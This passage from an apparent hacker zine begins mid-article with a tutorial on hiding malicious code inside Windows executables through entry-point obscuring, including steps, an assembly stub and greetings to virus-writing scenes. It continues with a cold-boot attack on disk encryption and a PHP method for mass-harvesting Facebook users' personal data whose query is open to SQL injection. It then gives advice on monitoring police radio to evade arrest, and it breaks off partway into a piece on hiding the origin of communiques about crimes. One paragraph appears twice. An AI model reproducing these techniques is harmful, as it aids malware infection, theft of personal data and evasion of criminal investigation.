the host code we are gonna store our\r\n     mal. code and write these X bytes to the new section. X is the size of the\r\n     mal. code + jump\r\n [5] Write our mal. code to that address\r\n [6] Create a jump to address (RVA of new section+sizeof(malcode)+sizeof(jump)),\r\n     this address is right after our backed up original code\r\n [7] Append this jump to the mal. code in the host code body\r\n [8] Create the restoration routine and write it to the address generated in [6]\r\n [9] Point the PE entrypoint to the address in the host code we wrote our mal.\r\n     code to\r\n\r\nOur restoration code should look like:\r\n  mov edi,0DEADBEEFh ; malicious code address\r\n  mov esi,0CAFEBABEh ; new section RVA+imagebase\r\n  mov ecx,0D3F4C3D1h ; section length\r\nlooplen:\r\n  lodsb\r\n  stosb\r\nloop looplen\r\n  mov edi,0DEADFED2h ; PE entrypoint\r\n  jmp edi\r\n\r\nI will now provide some sample code in C which should be easily portable to ASM\r\nfor anyone with at least some experience in PE manipulation and a decent\r\nunderstanding of ASM.

The same goes in this case for the jmp edi (0xFF 0xE7). \r\n\r\nAnother idea might be to position our mal. code + jump BEFORE the entrypoint (if\r\nthere is space of course), leave the EP intact and insert a jump to this spot at\r\nthe entrypoint. Yet another idea might be to shatter the code over different\r\nsections and link them together with jumps, creating code islands like z0mbie's\r\ncode in- tegration engine from Zmist.\r\n\r\nThere are many plays on this theme as you can see and although there are hordes\r\nof things that could use some fixing / perfectioning, it does get you familiar\r\nwith the possibilities of EPO, and gives you a jump to de- signing your own\r\npreferred methods. \r\n\r\nThere are many plays on this theme as you can see and although there are hordes\r\nof things that could use some fixing / perfectioning, it does get you familiar\r\nwith the possibilities of EPO, and gives you a jump to designing your own\r\npreferred methods. \r\n\r\n[0x06]Resources:\r\nhttp://msdn.microsoft.com/msdnmag/issues/02/02/PE/default.aspx\r\nhttp://msdn2.microsoft.com/en-us/library/ms680195.aspx\r\n\"Appending to the PE File\"      Lord Julus - 1999\r\nhttp://vx.netlux.org/lib/static/vdat/tuappend.htm\r\n\"Entrypoint Obscuring\"     GriYo\r\nhttp://vx.netlux.org/lib/vgy01.html\r\n\"Fighting EPO viruses\"     Piotr Bania\r\nhttp://vx.netlux.org/lib/apb00.html\r\n\r\nShouts and greets go to the Nullsec folks ;) the whole of RRLF, the .aware crew,\r\nxzziroz, PullThePlug, SmashTheStack, HackThisSite, the #dutch folks , #vxers and\r\n#vx-lab on undernet, irc.blackhat.ru, what's left of 29A and every true blackhat\r\nand scene lover out there, stick together guys!\r\n\r\n################################################################################\r\n Full Disk Encryption Attacks                                       by HackBloc\r\n################################################################################\r\n\r\nIf all your equipment was taken tomorrow what would someone be able to find out\r\nabout you? Think of all the data stored on old hard drives, CD / DVD ROMs, USB\r\nkeys and other media you might have around. All of this could be taken as\r\nevidence by police or federal agents if your home were raided, and in all\r\nprobability you wont ever see it again. There are several techniques one could\r\nimplement that make it harder for them to recover any of your data. One of which\r\nis disk encryption which we will be discussing in this article. \r\n\r\nThere are two methods of encrypting your disks, you can either encrypt specific\r\nfiles and folders or the entire disk. The problem with the former is that if an\r\nattacker were to analyze your disk they will be able to see that certain parts\r\nare encrypted and they will spend their time trying to crack that. It pretty\r\nmuch paints targets on your encrypted files, that's not to say this technique is\r\nuseless, depending on the encryption algorithm it can still be very strong,\r\nthough it does allow more analysis of your machine including files that might\r\nnot be encrypted such as cookies, chat logs, operating system files and\r\ntemporary files. \r\n\r\nThe other technique mentioned is encrypting your entire disk not just certain\r\nparts. The benefit of this is that everything including the temporary files,\r\noperating system files and meta data such as the file names and modification\r\ntimestamps are going to be encrypted as well, which will help to keep those\r\npesky federal agents out of all your secrets. Unless you had a few hundred\r\nthousand years to spend cracking the encryption key your data will be secure.\r\nRecently a team at Princeton University wrote a paper about how to extract the\r\nencryption key from the RAM module and from this decrypt the entire disk. \r\n\r\nMost people think that when you shut off your computer the data stored in the\r\nRAM is erased right away, this is not true. Due to what is called \"Memory\r\nRemanence\" data stored in your RAM can exist with out decaying for minutes even\r\nhours under the right conditions. This is bad news for those who are using disk\r\nencryption. The problem here is that for the computer to be able to read what is\r\non your encrypted hard drive it needs to have access to the key, which is stored\r\nin the RAM. As you can probably tell, if the data on the RAM is still there when\r\nthe machine is turned off, then the encryption key must also be there too. At\r\nroom temperature the quickest the RAM decayed to its default or ground state was\r\n2.5 seconds, the longest being 35 seconds, it depends on your RAM, factors like\r\nhow new it is, make / model etc. The Princeton team did notice that regardless\r\nof the type of RAM they all decayed with similar patterns. \r\n\r\nThe Princeton University Team used cans of compressed air to cool the RAM to\r\napproximately -50C while the machine was running. Their tests confirmed that at\r\nthese temperatures the RAM would retain its data for a much longer period of\r\ntime. In their tests they were able to keep 99.9% of the RAM intact without\r\npower for up to 60 second. When the chips were placed in liquid nitrogen for an\r\nhour they only experienced 0.17% data lose which would suggest that the RAM\r\ncould hold the data for hours if not days before decaying at these temperatures.\r\n\r\nThe image above is from the paper put out by Princeton University on the topic.\r\nIt shows how an image file decays after 5 seconds (left), the image is pretty\r\nmuch the same as the original, the next is after 30 seconds, then 60 seconds,\r\nand 5 minutes. If the attacker were forced to leave the RAM without power for\r\ntoo long the data will become corrupted. You can lower the rate of corruption by\r\ncooling the memory prior to cutting power, this will greatly decrease the amount\r\nof data lose. Another method that The Princeton Team used is to apply algorithms\r\nthey developed to correct errors in both private and symmetric keys. So what you\r\nhave a very cold stick of RAM with an encryption key on it, what now? If you\r\nhave access to your target machine and its powered on, all you would need to do\r\nis cold boot it by holding the power button or removing the power cord and\r\nplugging it back in. Then the simplest method to get the keys off is to boot to\r\na USB key with a custom kernel on it, you need this kernel to leave only a very\r\nvery small footprint on the memory to prevent overwriting the key. Once you boot\r\nto the USB key it would make image the RAM and copy this to itself allowing you\r\nto extract the key from it at a later time. The Princeton team put a video of\r\nthis process on their website, the entire attack only took a few minutes and was\r\nalmost completely automated by the tools they created.\r\n\r\nAnother attack one could use is to again cut power to the machine, not turn it\r\noff but cold boot it, then swap the DRAM module into another com- puter already\r\nsetup to image the chip. You would then continue the same way as before but this\r\ntime you are copying the image to the hard disk instead of a USB key. By using\r\nthis method you prevent the BIOS or other hardware the chance to clear the\r\nmemory while booting up. \r\n\r\nOnce they had the data the Princeton team analyzed the image from the ram and\r\nwere able to extract the key. Even when some of the data on the chip had already\r\ndecayed they were still able to extract the key and com- plete the attack. On\r\ntheir site they give a better explanation of finding and cracking the key, its a\r\nlittle beyond the scope of this paper. \r\n\r\nIncreasing the Life of the Data: If you were to hold a can of compressed air\r\nupside down and spray it would come out as a very cold liquid instead of a gas,\r\nthe evaporation of the gas causes and additional chilling, by spraying this\r\ndirectly on the memory module the Princeton team was able to cool the chip to\r\n-50C and below. They were able to keep al- most all the data on the chip even\r\nafter it was out of the computer for several minutes. As mentioned above when\r\nthe chip was placed in liquid nitrogen it was able to keep almost all its data\r\nwithout decaying for numer- ous hours. These attacks work against Apple's\r\nFileVault, the BitLocker Drive Encryption feature included in the Enterprise and\r\nUltimate versions of Windows Vista, the open-source tool TrueCrypt, and the\r\ndm-crypt module built into Linux kernels. \r\n\r\nThese attacks prevent a risk to anyone who relies on disk encryption, even if\r\nyour machine is locked by a screen saver, or in some form of hibernation the key\r\ncan still be extracted. These do not provide any security. There are no easy\r\nfixes to this problem at this time, the best method of preventing these attacks\r\nis to shut your computer down completely before walking away from it, do not\r\nwalk away from it if your in a place where someone could potentially walk away\r\nwith it. These attacks are pretty advanced and require lots of technical\r\nknowledge to use. If your just worried about a common thief stealing your\r\ncomputer while you sit at a coffee shop, you disk encryption should keep your\r\nsecrets. If your worried about federal agents, NSA etc then you need to consider\r\nthe local security of the machine. \r\n\r\n################################################################################\r\n All Your Facebook Are Belong to Us                                 by Flatline\r\n################################################################################\r\n\r\nWe all love communication, it is at the essential nature of humanity, we are\r\ninherently social beings for the most part. In this Internet age social networks\r\nhave become an increasingly central way for people to communicate. Recently,\r\nFacebook, one of the more popular social networks has released an API whereby\r\npeople can create applications that run within Facebook. This seems like a good\r\nfun thing at first, but all those cute little applications that let you slap and\r\npoke your friends, track football teams or share recipes with your friends have\r\na insidious underside. I am talking about the dual demons of marketing and\r\nidentity theft. Any application that you have added on Facebook is by default\r\nallowed to access all the information on your profile through a very simple API.\r\nUsing this method I collected personal data on 100,000 people simply with a few\r\nlines of code and a Facebook application that went viral. Here I will show you\r\nhow I dit it.\r\n\r\nThe first step is to write a Facebook application, the Facebook network has an\r\nAPI or Application Programming Interface that is public. What this means is that\r\nanyone who wants to can write an application that will hook into the Facebook\r\nsite and the Facebook database. The applications are primarily writ- ten in PHP\r\n(although there are a large number written in Java, Ruby, Python and even C++).\r\nHow it works is, the application is written with calls to the Facebook API. Then\r\nwhen a user visits your application via the Facebook website, Facebook uses a\r\ntechnique called REST to request the application from your server and display it\r\nvia Facebook. The Facebook API offers a lot of features to the developer that\r\nallow seamless interaction with the database and UI, but what we are interested\r\nin is the API's ability to access the Facebook database. \r\n\r\nACCESSING THE DATABASE\r\nOnce you have your application written and it has gotten quite large (100,000\r\nusers is a modest Facebook application, these things really do have a tendency\r\nto go quite viral), it is time to start the information digging. Each Facebook\r\napplication can access many many stats on each user including but not limited to\r\nName, username, Gender, Sexual Preference, Religion, Political Preference, Age,\r\nGeographic Location, Inter- ests, Facebook networks and a list of their Facebook\r\nfriends. How would one do this you might ask? Just a few simple lines of code: \r\n\r\n<code>\r\n  <?php \r\n         /*This is the magic line! This line gets all the info we need, as you\r\ncan see right here I am only getting the birthday, gender, geographic location\r\nand education level of the user, but I could get all of the things mentioned\r\nabove just as easily). This assumes that the user ID has been already stored in\r\nthe variable $user. */\r\n\r\n$foo=$Facebook->api_client->sql_query(\"SELECT birthday, sex, current_location,\r\neducation_history FROM user WHERE uid = $user\");\r\n        \r\n// Start the query\r\n$query = \"INSERT INTO users_information (uid, sex, city, state, country, school,\r\nbirthday) VALUES (‘$uid', ‘$sex', ‘$city', ‘$state', ‘$country', ‘$school',\r\n‘$birthday') ;\r\nmysql_query($query);\r\n  ?>\r\n</code>\r\n\r\nJust those simple lines of code was all it took me to get all the data on\r\n100,000 Facebook users. Of course being a responsible citizen I promptly deleted\r\nthe data after I collected it, removed my application and de- leted my Facebook\r\naccount. But what if I was not a responsible citizen? I could have sold that\r\ndata to mar- keting companies such as double click or choice point. I could have\r\nsold that data to identity theives or con artists or spammers to easily fool\r\npeople into loosing their money and livelihoods. I could have even sold that\r\ndata to government agencies intent upon mapping out social networks and\r\ninterests of people and cre- ating personality profiles for everyone in their\r\ncountry. I can guarantee you with 100% certainty that people are doing all 3 of\r\nthose things as your read this article. I know because I have talked to them, I\r\nhave sat in conference rooms with them and stared into the eyes of the abyss. \r\n\r\nHOW CAN I PROTECT MYSELF\r\nWell, the easiest and best thing you can do is delete your Facebook account\r\nright now. I am serious, even if you add one application you can bet that your\r\ndata is being bought and sold, that is how these applications make money. Even\r\nif you don't add an application you can bet that coders with no conscience will\r\nbe writing scripts to steal your information and map out your social networks.\r\nShort of that, when you add a Facebook application you can select a box to not\r\nallow it to access your personal information, but many applications wont allow\r\nyou to add them if you don't let them access your information.\r\n\r\nSwitching to myspace or orkut won't help either. To compete with Facebook they\r\nare going to open up their API's to developers also, specifically both of those\r\nnetworks will soon be using Google's ‘Open Social' API. I have done some\r\nresearch into this API and I can tell you that the method of getting all of the\r\nusers data is almost exactly the same, and its just as easy. \r\n\r\nAlternatively you could just put a load of fake information up about yourself\r\nincluding a fake name and fake pictures, but this still lets people identify\r\nnaturally occurring social networks. So the best bet is just not to create an\r\naccount on a social network at all. If you must, I recommend using Riseup.net's\r\nCrabgrass social network written about in this issue of HackThisZine.\r\n\r\n################################################################################\r\n Communication Systems and Technology\r\n################################################################################\r\n\r\nTechnology\r\nThere is a great deal of communications technology available to us today. I'm\r\ngoing to cover, very briefly, a few devices I think anarchists could use.\r\n\r\nScanners\r\nRadio scanners are invaluable tools for gathering information that is being\r\nbroadcast by someone else. They work by scanning through a great number of\r\nfrequencies in a short amount of time looking for active broadcasts. When an\r\nactive broadcast is found, the scanner stops so the user can listen to it.\r\n\r\nThe FCC, the agency responsible for allocating radio frequencies for different\r\nuses typically allocates a certain band, or group of frequencies, for each\r\ntechnology. This means that if, for example, you wanted to listen to the\r\ntransmissions of air traffic controllers, you could get on the internet and find\r\nout that the FCC has allocated the range of frequencies from about 960 MHz to\r\nabout 1215 MHz for that purpose. You could then use a scanner to search rapidly\r\nbetween these frequencies, picking up any transmission that occurred. With the\r\nright scanner, potentially connected to the right computer, you could listen in\r\non almost anything. \r\n\r\nFor the purposes of this article, I'll focus on monitoring police frequencies.\r\nBelieve it or not, most police frequencies are broadcast in the clear for anyone\r\nwith a scanner to listen to. I guess it's done that way so reporters and\r\nmilitary veterans can listen in and feel up-to-date or something.\r\n\r\nGetting Started\r\nScanning your local police department may be easier than you ever imagined. I\r\nsuggest going online and using google.com to search for local frequencies. Radio\r\nhobbyists are a resourceful and charitable bunch, and they usually post the\r\nfrequencies they find on the internet. Another place you can find frequencies is\r\nin books or magazines. Radio Shack carries a book that lists many of the police,\r\nfire, and EMT frequencies in the country. If all else fails, you can usually\r\nfind police channels by scanning around, especially between 150Mhz and 160Mhz.\r\nThey're not difficult to recognize!\r\n\r\nOnce you have the frequencies, consult your scanner's manual (you did keep it,\r\nright?). Depend- ing on your scanner, you should be able to program all the\r\npolice frequencies into a ‘bank' of frequencies, so as to scan only that bank.\r\nIf you can do this, you'll hear just the police frequencies. Next, you'll have\r\nto adjust the squelch. What is that, you ask? Typically, there will be a knob on\r\nyour radio next to the volume knob. This is squelch. When you turn it all the\r\nway down, you will hear that nasty radio noise you hear when your car radio\r\nisn't turned to a station. Slowly turn up the squelch and the noise will go\r\naway. This is a necessary step, because it adjusts your scanner for the amount\r\nof noise that is in your area. If you don't do this, your radio won't be able\r\nto dif- ferentiate between a real signal and mere noise. OK, now you're ready to\r\nstart scanning. \r\n\r\nWhen you first start scanning, the police may sound like they're speaking some\r\nutterly unrecog- nizable dialect of English. Don't be put off, keep listening,\r\nand things will start to make sense. The first thing you'll probably pick up on\r\nis them running names, license plates, and so on. They'll broadcast full names,\r\nbirth dates, addresses, and social security numbers. You'll also start to\r\nrecognize when they're being dispatched, to which locations, and what for.\r\nSometimes an officer will even announce his home phone number right over the\r\nair! The more you listen, the better you'll get at figuring out their jargon.\r\n\r\nTip: You may find that a key to the ‘police code', the jargon used on the air by\r\nyour local police department, is available for download off the internet.\r\n\r\nTrunking\r\nWhen looking for frequencies on the internet, you may find that the agency you\r\nwant to listen to uses a ‘trunk- ing' system. What the hell is that? The term\r\n‘trunking' refers to a system that uses advanced technology to split up a\r\nlimited amount of radio frequencies. Imagine that the government of a large\r\ncity, say, Chicago, wants to set up a radio network. Chicago is a very big city\r\nand has a great deal of communications needs. The Police Department, the Fire\r\nDepartment, the Parks Department, the Water Department, the garbage collectors,\r\nand many more all need to communicate, and many of these agencies will need to\r\nuse at least a few frequencies. This creates a problem, because radio\r\nfrequencies are not an abundant resource. Even a hundred or so fre- quencies\r\nmight be impossible to come by. So, someone figured out how to utilize fewer\r\nfrequencies for more activity. Most people using a radio aren't using it all or\r\neven most of the time. Let's say that Chicago needs a hundred separate channels,\r\nbut they'll only use each channel about ten percent of the time. That means that\r\nif there were a way to share frequencies, they could put all 100 channels on\r\nonly ten frequencies. This is what trunking does. \r\n\r\nWhen dealing with a trunking system, one is presented not with frequencies but\r\nwith ‘workgroups.' Every radio is assigned to a workgroup, and each workgroup\r\nhas a different purpose. The police, for example, might have five different\r\nworkgroups representing different districts. The system is controlled by a\r\ncomputer that broadcasts a digital signal on its own frequency. Whenever someone\r\nin a certain workgroup presses the button to broadcast something, the computer\r\nassigns them a frequency to broadcast on and tells every other radio in that\r\nworkgroup to listen to that frequency. In use, the system is totally\r\ntransparent; it doesn't seem any different than using any other radio. \r\n\r\nWhat does this mean for you? First, if the agency you want to listen to uses a\r\ntrunking system, you will need a trunking scanner. There are several different\r\ntrunking systems, so before getting a scanner, figure out which kind you'll\r\nneed. The scanner I have can scan Motorola or EDACS trunked systems, which\r\naccount for almost all of them. You'll also have to read your manual and learn\r\nhow to program in the system you want to listen to. It's not that hard, I\r\npromise! Also, if you're scanning around and hear a bunch of random tidbits that\r\ndon't relate to one another all on the same frequency, you're probably listening\r\nto bits of a trunked system. \r\n\r\nA very small amount of agencies are now using ‘digital' trunking. I don't know\r\nmuch about this yet, except that you have to get a really expensive scanner to\r\nfollow it. If your local department uses this, you might be shit out of luck.\r\n\r\nIf used properly, a scanner can keep you one step ahead of the police in the\r\nstreets. At a recent small-scale street protest in a little college town, we\r\nused one to learn where police were setting up, how many of them there were,\r\nand what their standing orders were. They even unknowingly helped us find the\r\nlocal Starbucks and Army recruiting station! This allowed us to maneuver around\r\ntown without getting cornered, and to disperse before they were ordered to\r\narrest us. Not bad! \r\n\r\nFRS/GMRS Radio\r\nI most frequently see people at protests attempting to communicate by means of\r\nFRS (Family Radio Service) or GMRS(General Mobile Radio Service) walkie-talkies.\r\nThese radios are often available on the ‘optional payment plan' at department\r\nstores, outdoor stores, WalMart, and so on. Though they are cheap or free, these\r\nradios have severe limitations. \r\n\r\nThe Family Radio Service is one of the ‘Citizen's Bands' designated by the FCC\r\nto permit families and friends to communicate over short distances. You don't\r\nhave to have a license to use one. However, the FCC has severely limited the\r\noutput power on FRS radios, which means that at most they have only a one mile\r\nrange. In practice, this range is much shorter, especially in major cities where\r\nthere are many tall concrete buildings and other kinds of interference. My\r\nhumble opinion is that these radios are totally useless in any important\r\nsituation. They are simply not reliable, not to mention static-ridden. I've seen\r\nFRS radios fail to communicate over a distance of only one block! \r\n\r\nThe General Mobile Radio Service is a radio service specifically established by\r\nthe FCC ‘for short-distance two- way communications to facilitate the activities\r\nof an adult individual and his or her immediate family members.' The regulations\r\nallow for more powerful transmitters (1 to 5 watts), which means that GMRS\r\nradios have a significantly greater range. These radios tend to be much higher\r\nquality. However, in order to legally operate a GMRS radio, you must first\r\nobtain a license from the FCC. I am still somewhat dubious about how effective\r\nthese radios can be in direct action, but they are definitely a much better\r\noption than FRS radios. \r\n\r\nThe operation of FRS and GMRS radios is basically the same, and usually very\r\nsimple. There is typically a small LCD screen that displays a number\r\nprominently. This is the channel you're operating on. Everyone who wishes to\r\ncommunicate together must set their walkie-talkie to the same frequency. Some\r\nradios also have what is referred to as a ‘decoder' or ‘digital decoder.' If\r\nyour radio has this, a smaller number will appear next to the channel number.\r\nThis is the decoder number. A decoder allows your radio to filter out unwanted\r\ntransmissions by only letting those with the right decoder message through. If\r\nyou are communicating in a network that has some radios with decoders and some\r\nwithout, those radios with decoders must set their decoder number to ‘0' in\r\norder to be understood by the others. Check your manual to learn how to do this.\r\nChannel: Each channel on a radio refers to a different frequency. Band: A band\r\nis a range of frequencies. Tip: Only one person can broadcast on a radio\r\nfrequency at a time, so keep your transmissions brief, and don't try to talk\r\nover anyone. Tip: When using a radio, speak calmly, and keep the microphone six\r\nto twelve inches from your mouth. Talking too loudly or too close will turn your\r\ntransmission into a garbled mess. \r\n\r\nAmateur Radio Service (Ham Radio)\r\nHam radio is a service specified by the FCC to allow individuals solely with a\r\npersonal interest (as opposed to economic interest) to operate on several\r\ndifferent radio bands. The ham radio specification gives an operator a lot of\r\nfreedom as to the frequencies and equipment she can legally use.\r\n\r\nThe benefits of ham radio are extensive. The specification allows the use of\r\ntransmitters as powerful as 1000 watts in some cases! It also allows you to use\r\nfrequencies that are so low that their wavelength can be 10 or 20 or more meters\r\nlong. This means that the signal can travel extreme distances before fading.\r\nPeople have often used ham radio to communicate with people halfway around the\r\nworld! You can even use ham radio to bounce a signal off satellites or the moon. \r\n\r\nLike any thing else, though, ham radio has its downsides. For one, legally, you\r\nhave to be licensed to operate a ham radio. Also, the equipment can be\r\nrelatively expensive and difficult to obtain. It can also be a bit more\r\ncomplicated to operate. \r\n\r\nThe licensing process for ham radio is pretty straightforward. Local ham radio\r\nhobby groups sponsor testing all over the country. You can find out where the\r\nnearest test is being given at www.arrl.org. To study for the test, I recommend\r\nfinding a copy of Now You're Talking! This book covers everything you need to\r\nknow for the test. Honestly though, the test is very easy. If you're pressed for\r\ntime, consider just reading through the questions in the back of the book: these\r\ninclude every possible question that could be given on the exam.\r\n\r\nFirst, you'll want to take the ‘Technician' exam. This will give you access to\r\nthe most popular ham radio bands. If you get really interested, you might\r\nconsider taking the ‘Tech Plus' (for which you'll need to learn Morse code),\r\n‘General,' or ‘Extra' exams, each of which offers added privileges. Another\r\nreason to own a ham radio license is that it often gives you the right to carry\r\na scanner on the street. Many states have ordinances pro- hibiting this, but\r\nthey usually have exceptions for licensed amateurs.\r\n\r\nHam radios have a great deal of potential for our purposes. There are many\r\nhandheld ham radios available that would be perfect for use in the streets.\r\nBecause these radios are relatively small, they are usually limited to only 5 or\r\n6 watts, which is relatively low. However, amateur hobbyists have set up a\r\nnetwork of ‘repeaters' all over the country that allow you to extend the range\r\nof your radio. Essentially, a repeater is a station that receives broadcasts on\r\none frequency, and then rebroadcasts them on a slightly different one; for\r\nexample, a repeater could pick up a transmission from a relatively weak handheld\r\nradio and rebroadcast it at a few hundred watts or more. Suddenly, the range of\r\nthat relatively weak handheld becomes immense. Imagine a comms team able to\r\ncommunicate not only throughout a whole city, but an entire region! \r\n\r\nAll in all, I think ham radio is a valuable resource. I find it to be a much\r\nbetter option than FRS or GMRS for anyone that can acquire the technology and\r\ntake the time to get the license.\r\n\r\nRemember: Any transmission that goes out over radio waves can and will be heard\r\nby the authorities.\r\n\r\nSMS Text Messaging\r\nFor anyone that's been living in a cave recently, I'm envious. But you may not\r\nhave heard about this wonderful technology! SMS text messaging is the same thing\r\nthat people all over the place are using to send little notes back and forth\r\nbetween cell phones. Basically, it's a protocol that allows people to send\r\nsimple plain-text messages to each other via wireless devices.\r\n\r\nSMS doesn't just work on cell phones either. You can also receive messages with\r\nan alphanumeric pager. They've even created little two-way pagers that have a\r\nfull keyboard so you can receive and respond to text messages.\r\n\r\nA corporate defector I know grabbed a few of these two-way pagers for me once.\r\nThey turned out to be very useful. Messages came in without any possible loss of\r\nclarity. They worked almost anywhere, and you could respond quickly. I'm not\r\nsure how much the service cost because a major investment firm was paying for\r\nmine, but I've heard that it's somewhere between $10 and $20 a month.\r\n\r\nThe recent release of txtmob.com really established text messaging as a tactical\r\ntool. Txtmob.com is the brainchild of those lovely people over at the institute\r\nof applied autonomy (appliedautonomy.com). Essentially, the service acts like an\r\nemail list. People subscribe to a group, and messages sent to the group get\r\nrebroadcast to everyone else in the group. Just like an email list, a txtmob\r\ngroup can be invite-only or open for anyone to join, and it can be moderated\r\n(only one person can send messages to the group) or unmoderated (anyone can send\r\nto the group). Txtmob was created for use during the Democratic National\r\nConvention protests in Boston. It was used by the Indymedia collective to\r\nrebroadcast reports as they received them. In this way people were sent timely\r\nand clear information regarding the activities of police and protesters in the\r\nstreets.\r\n\r\nI find this technology to be one of the most promising to protesters in the next\r\nfew years. To begin with, SMS enable devices are all over the place, many people\r\nhave SMS enable cell-phones, and pagers are pretty cheap. SMS can enable a large\r\nnumber of people to communicate almost simul- taneously and with little risk of\r\ndistortion or confusion. In addition, SMS devices are almost always in signal\r\nrange, and messages can be broad- cast across the country. \r\n\r\nPutting It All Together I can already hear you squirming impatiently in your\r\nseat, dear reader. You're saying, ‘The technology's all fine and good, but how\r\ncan we use it to form effective comms teams'? In all honesty, I'm not a hundred\r\npercent sure. I have yet to operate with a comms team that worked to my complete\r\nsatisfaction. However, I do have some good tips about using comms, and some\r\nideas as to what a really good comms team might look like.\r\n\r\nComms Team Structure The most important step in forming a solid communications\r\ninfrastructure for an action is getting right people for the job. Those\r\nparticipating in a comms team should, ideally, be cool, calm, and quick-witted.\r\nThere are many roles individuals can play, and it's important to match the right\r\nperson to each one.\r\n\r\nThe most visible member of the comms team is the scout. Scouts are primarily\r\nuseful in a mass-protest or march situation. It is their job to collect\r\ninformation about the movements of the police or any other po- tential threat to\r\nthe action actually occurring. Scouts should make efforts to make themselves\r\nhard to spot and hard to capture. To this end, I've used two basic approaches:\r\nbicycles and disguises. Bicycles are great for scouts because they allow them to\r\nmove very quickly about a large area. A quick and experienced bicyclist is also\r\nvery difficult to stop and arrest. Disguise is a more effective technique if the\r\ngroup needs continu- ous updates on or from a given location. In the past, I've\r\nscouted an area by donning a nice suit and drinking coffee on a patio of\r\ninterest. No one thinks twice about a ‘business person' drinking coffee and\r\ntalking on a cell phone or typing on a laptop. \r\n\r\nTip: Don't use too many codes. In a stressful situation, militants will be hard-\r\npressed to remember the meaning of codes they're supposed to use on air, and the\r\nquality of communication will deteriorate. \r\n\r\nI believe a solid comms group should also include someone whose sole job is to\r\nmonitor police transmissions. In some cases, it is actually beneficial to have\r\nseveral people doing this. I say this because a person can only listen in on one\r\ntransmission at a time, but in a mass-protest situation there will likely be\r\nlots of police transmissions occurring simultaneously. It would be the duty of\r\nthose filling this role to report back on any announced police strategies,\r\nmovements, arrests, standing orders, and so on. \r\n\r\nScouts and radio monitors will, in many circumstances, be generating a great\r\ndeal of information, too much, perhaps, to make any sense to the great majority\r\nof people participating in the action. For this reason, I be- lieve that it can\r\nbe necessary to have several people whose task it is to sort through the\r\ninformation, pick out the pertinent parts, and re-broadcast these to the masses.\r\nPerhaps we could call these people the vanguard! Seriously though, I do think\r\nthat some situations might warrant a small level of centralization in this\r\nregard. Individuals occupying this position could make sure that important\r\ninformation is relayed by as many types of media as possible: e.g., radio, text\r\nmessaging, cell phone calls, and so on. They could also find and dis- seminate\r\ncrucial logistical data, such as potential alternate routes, by looking at\r\nstreet maps, sewer maps, and such. \r\n\r\nAt the protests against the World Bank that occurred in Prague late in 2000,\r\nthere was an information clearinghouse in the form of a room with several\r\ntelephones operated by people equipped with maps. They received constant updates\r\nas events developed, and plotted the movements of police and protesters on these\r\nmaps; they also took phone calls from demonstrators in need of this information.\r\nBy many accounts, this service was critical to the success of the protests. Of\r\ncourse, your comms team may find it handy to have a tech-geek around. (I\r\nvolunteer!) This person could make sure that the radios are working right, the\r\nscanners are programmed, the txtmob list is set up, the repeaters are functional\r\nand so forth. \r\n\r\nYou can make a radio repeater very simply with two radios. A repeater receives a\r\nsignal on one channel, and rebroadcasts it on another; this is handy for\r\nincreasing the range of a radio signal, or for allowing someone to hear the same\r\nsignal on several different bands, for example, you could pick up a ham radio\r\nsignal and rebroadcast it on a GMRS frequency. \r\n\r\nTo do this, you need a radio capable of receiving the signal in question, and\r\nanother radio capable of broadcast- ing on the desired output frequency. You'll\r\nneed to take these radios to an electronics store and find a cable or an adapter\r\nthat allows you to connect the headphone (output) jack of the receiver to the\r\nmicrophone (input) jack of the transmitter. Connect the two devices. Depending\r\non your output radio, you may need to turn on ‘vox' or ‘accessory vox.' You may\r\nneed to fiddle around with it, but it should work just like that. \r\n\r\n################################################################################\r\n Anonymity with Wireless Networking                                   by IMPACT\r\n################################################################################\r\n\r\nINTRODUCTION\r\nSomewhere in this country right now there is an FBI branch office, and in this\r\noffice is a cluttered desk, and on this desk is an investigation manual, and in\r\nthis manual is a chapter entitled \"Investigating Political Crimes.\" And the\r\nfirst thing this section says is \"Track the communique.\"\r\n\r\nSince perhaps the inception of direct action militants have composed and\r\nreleased, by various means, statements explaining their action. These\r\ncommuniques, which are of the utmost importance to a campaign of \"propaganda by\r\nthe deed,\" can be dangerous, and have often turned out to be the fatal stumbling\r\nblock in what might have otherwise been an ingeniously conceived of and executed\r\nplan of action. The communique often serves as the state's first piece of\r\nevidence that directly connects back to the individuals involved in the crime\r\nunder investigation. Because of this, the DA enthusiast must be extremely\r\ncautious with communiques lest her words of inspiration to the masses become her\r\ndownfall. \r\n\r\nOver time, the method by which communiques have been delivered has varied.\r\nPerhaps the first one was carved into the body of a fallen crusader and\r\ncatapulted over a castle wall. Who's to say? As time went on, new technologies\r\nprovided new opportunities and risks for dissidents to get their message out.\r\nThe Internet is the most obvious modern instance of this trend.          \r\n\r\nThe Internet offers many advantages to agents in the field (which is to say our\r\nagents in the field). Most obvi- ously relevant are the internet's capability of\r\nreaching such a large amount of people in such short time and a the sense of\r\nanonymity that it provides. It is this sense of anonymity that has caused\r\ntrouble for some. In this article I plan on explaining why this sense of\r\nanonymity is little more than an illusion, and then go on to show how - like\r\nmany illusions - this one can be made real with a little effort. \r\n\r\nIP ADDRESSES\r\nEach time we open a web browser and type in an address we're asking our computer\r\nto contact another com- puter and retrieve certain information. It's like\r\ngetting in a cab and saying \"Take me to Barthélemy's Bar.\" In order to actually\r\nget to the bar though, the cab driver has to process this information into\r\nsomething actu- ally usable such as an address, or intersection. Your computer\r\ndoes the same thing, it translates the domain name you typed in into what is\r\nreferred to as an IP address. Every computer connected to the Internet has an IP\r\naddress. An IP Address is a set of four numbers ranging from 0 to 255 separated\r\nby decimal points, eg. 64.128.0.14. Think of this like the street number\r\nattached to your house or your telephone number. Unlike street addresses and\r\nphone numbers, though, your IP addresses can change, and will typically do so\r\noften. \r\n\r\nEvery time you visit a web site, send out an e-mail, or do some other task\r\nonline, the IP Address your comput- er is using is logged. Even though this\r\nnumber might not be your number in the sense that your phone number is your\r\nnumber, it can still be traced to you. If, for example, you were using a dialup\r\nor broadband Internet account with someone's name attached to it, then the\r\nInternet Service Provider can determine whose account the address was attached\r\nto at the time you visited the site. Even if you use a publicly accessible\r\ncomputer, your activities can be traced. \r\n\r\nLet's say, for example, an anarchist writes a communique on a computer at a\r\npublic library. This library is a little less conservative than most these days\r\nand doesn't require users to log in with an ID or library card. So, the\r\nanarchist in question thinks she's free and clear. She is, of course mistaken.\r\nThe first thing the Feds would do is find the IP Address of the computer that\r\nsent the email, or posted the message on a message board or whatever (this is a\r\ntrivial task). Next, they would check publicly available records and find out\r\nthat the IP Ad- dress is owned by the library in question. The Feds would then\r\ngo to the library and ask their computer techni- cians which library terminal\r\nwas using the IP 